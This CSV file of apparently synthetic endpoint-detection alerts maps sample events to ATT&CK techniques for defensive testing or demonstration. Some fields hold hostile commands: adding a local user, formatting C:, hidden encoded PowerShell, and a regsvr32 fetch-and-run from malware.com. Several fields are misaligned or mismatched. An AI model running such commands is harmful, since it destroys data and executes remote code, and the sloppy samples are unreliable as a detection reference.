AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName
1234,,2023-03-10T12:00:00Z,High,Endpoint Detection and Response,,Direct Volume Access,Adversaries may directly access a volume to bypass file access controls and file system monitoring.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,MyComputer,192.168.1.100,Windows 10,123,cmd.exe /c net user test test123 /add,Direct,Write,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
934445,,2022-03-20T15:45:00Z,,,,Potential disk wiping activity detected,dversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources.,,,,,,,,,,,,cmd /c format c:,,,,,,,,,,,High,,,Behavior,,Disk Wipe,,,,,,,,EDR,,,,,,,C:\Windows\System32\cmd.exe,cmd.exe,,,,,user123,,,,,,,,,,example-device,123456,Windows,10.0.19042,2022-03-20T15:40:00Z,explorer.exe,explorer.exe,2022-03-20T15:30:00Z,example-device2,789012,Windows,10.0.19042,user456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
098888,,2022-03-06T14:35:00Z,,,,Drive-by Compromise Detected,This alert fires when a drive-by compromise attempt is detected on an endpoint.,,,,Malware,,,,,,,,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",,"['Isolate the affected host immediately', 'Scan the host with an antivirus or EDR tool', 'Investigate the network traffic and identify the source of the attack']",,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,chrome.exe,,ab1234567890,cdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,192.168.1.101,,,,,,,,,,,,,,,,,,,,,,,,Host,COMPANY-PC01,Windows 10,"['https://attack.mitre.org/techniques/T1189/', 'https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/drive-by-compromise']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9989898,,2022-03-08T14:32:47Z,,,,Denial of Service,Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.,,,,,High,,,,,,,cmd.exe /c ping -n 10000 127.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,Behavior monitoring,,,,,,,,cmd.exe,,,,192.168.1.101,acme\jdoe,1224,,,,,,,,,,,,,,,,,,,,,,,,,,"['Delivery', 'Exploitation']",acme.local,WIN10-PC,https://securitycenter.windows.com/alert/1234567890,Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
111235,,2023-03-08T12:00:00.000000Z,,,,Exfiltration Over Alternative Protocol,"This alert is triggered when an adversary attempts to exfiltrate data using a protocol or service that is not typically used for this purpose, such as DNS or ICMP, using a command-line interface.",,,,,,,,,,,,,Behavior Monitoring,,,,,,,,,,High,,,,,Data Exfiltration,,,,,,,,,,,,,,,,,nslookup example.com 8.8.8.8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02049090,,2022-03-10T15:30:00Z,,,,Exploit Public-Facing Application,An attempt was made to exploit a public-facing application on the endpoint.,,,,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,High,Chrome,,ThreatDetection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft,Defender for Endpoint,C:\Program Files (x86)\Google\Chrome\Application\chrome.exe,5C6FCC7895CA5A218D8E3A9FDF56DEA1,HTTPS,192.168.1.100,54678.0,198.51.100.1,443.0,example.com,https://example.com/login,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030406fy,,2022-06-01T09:17:23Z,,,,Exploitation for Client Execution,Exploitation for Client Execution was detected on COMPANY-PC-01. The process 'cmd.exe' was launched with the following command line arguments: '/c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JAB3AD4.....'.,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JAB3AD4.....,,2a725f4d3d3dc6f3251a852f7686e8c6d7b6c98f17a0b0a51d6409aa9c32b327,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,Review the process and the associated arguments to determine if this was a legitimate action or if further investigation is needed. Consider blocking or restricting the use of Powershell or other scripting languages where appropriate.,,,,,,,,,,,,,123456,COMPANY-PC-01,C:\Windows\explorer.exe,C:\Windows\system32\cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020490,,2023-03-10T12:00:00Z,,,,Exploitation for Defense,"dversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",,,,,,Exploitation for Defense Evasion,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\system32\cmd.exe,cmd.exe,cmd.exe /c echo hello world,,,192.168.1.100,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,TCP,,,,,,,,,,,,Endpoint,server01,admin,Windows,4444,Blocked,Exploit detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020304,,2022-04-01T14:30:00Z,,,,External Remote Services Connection,A connection to an external remote service has been detected.,,,,,,,,,,,,"explorer.exe /root,C:\Windows\system32",,"['Block the connection to the external remote service.', 'Investigate the process and parent process to determine if they are legitimate.']",,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,cmd.exe,cmd.exe /c dir,,,,,,,,,,,,,,,,,,,,TCP,,,10.0.0.2,8080,,,,,,C:\Windows\system32\cmd.exe,C:\Windows\explorer.exe,,,,,,,,1234,5678,Outbound,Unknown,Unknown,"['8080', '8443']",10.0.0.2,,http://10.0.0.2:8080,,Unknown,Unknown,Unknown,Unknown,Unknown,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020405,,2023-03-10T13:00:00Z,,,,Permissions Modification,Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.,,,,,,File and Directory Permissions Modification,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\system32\config\SAM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,workstation01,user01,,,Blocked,Unauthorized file permission change,,,,,,,,,,,,,,,,SYSTEM,Full Control,Read-only,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
032040f06,,2022-03-06T09:18:56Z,,,,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.",,,,,,,,,,,,"cmd.exe /c rundll32.exe bios.dll,CorruptFirmware",EDR,,,,,,,,,,High,,,,12345,Firmware Attack,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0000w0r,,,,,,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access.",,,,,,,,,,,,,,"['Investigate the hardware addition to determine if it is legitimate or unauthorized', 'If the hardware is unauthorized, remove it from the endpoint immediately', 'Consider implementing endpoint security controls to prevent unauthorized hardware additions']",,,,,,,,,High,,,EndpointDetection,,Malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EventType,Equals,HardwareAddition,"['T1200', 'Hardware Additions', 'Endpoint Detection']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dkfkgl,,2023-03-10T15:00:00Z,,,,Hijack Execution Flow,"Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time.",,,,,,Hijack Execution Flow,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,svchost.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized process injection,,,,,,,,,,,,,,,,,,,,,,,malware.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0294fty,,2023-03-10T16:00:00Z,,,,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior.",,,,,,Impair Defenses,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,laptop01,user01,,,Blocked,Unauthorized security control disablement,,,,,,,,,,,,,,,,,,,,,,,,,Windows Defender Antivirus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-34567,,2022-10-31T15:20:30Z,High,,,Implant Internal Image,Implant internal image detected on PC-1234,,,,,,,,,,,,,,,,,,,internal_image.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,8bc6ab5d6ec7f21202fc9c9358c62d53e1e7ed1a,C:\Program Files (x86)\MyApp\internal_image.dll,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
asdfkwkl45,,2023-03-10T17:00:00Z,,,,Indicator Removal,Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses.,,,,,,Indicator Removal,,,,,,,,,,,,,,,,,High,,File Deletion,,,,,,,,,,,,,,,Defense Evasion,,,C:\ProgramData\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized file deletion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30405607356,,2023-03-10T18:00:00Z,,,,Indirect Command Execution,Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.,,,,,,Indirect Command Execution,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Execution,,,,regsvr32.exe,regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
222221,,2022-03-03T13:42:17Z,,,,Unusual Parent Process,A suspicious parent child process relationship with cmd.exe descending from an unusual process was detected.,,,,,,,,,,,,,,,,,,,,,,,High,Command and Scripting Interpreter,,,,Command and Scripting Interpreter (T1059.003),,,,,,,,EDR,,,,,,DESKTOP-ABC123,,cmd.exe,cmd.exe /c echo 'Hello World',,,,JohnDoe,,,,,,,,,,,,,,,MyCustomProcess.exe,,,,,,,,,,,,['Command and Scripting Interpreter'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,"{'ParentProcessName': 'MyCustomProcess.exe', 'ParentProcessPath': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'ParentProcessCommandLine': 'MyCustomProcess.exe /run'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
75668383,,2023-03-10T18:00:00Z,,,,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.",,,,,,Modify Authentication Process,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Userinit,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
039403802,,2023-03-10T19:00:00Z,,,,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.",,,,,,Modify Cloud Compute Infrastructure,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of cloud compute instance attribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AWS,ModifyInstanceAttribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02040506,,2023-03-10T20:00:00Z,,,,Modify System Image,Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.,,,,,,Modify System Image,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\System32\ntoskrnl.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,system,,,Blocked,Unauthorized modification of system file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2023-03-10T14:30:00Z,,,,Network Boundary Bridging,Defender for Endpoint EDR has detected network boundary bridging activity in the environment.,,,,,,,,,,,,"C:\Windows\explorer.exe /root,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-A2DD-08002B30309D}\::{2227A280-3AEA-1069-A2DE-08002B30309D}",Behavioral Analysis,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,TCP,,,,80,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\explorer.exe,,,EXAMPLE_USER,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Network Boundary Bridging (T1599),192.168.1.100,10.0.0.2,example.com,Network Boundary Bridging,TCP traffic from an internal IP address to an external IP address,ABCD1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
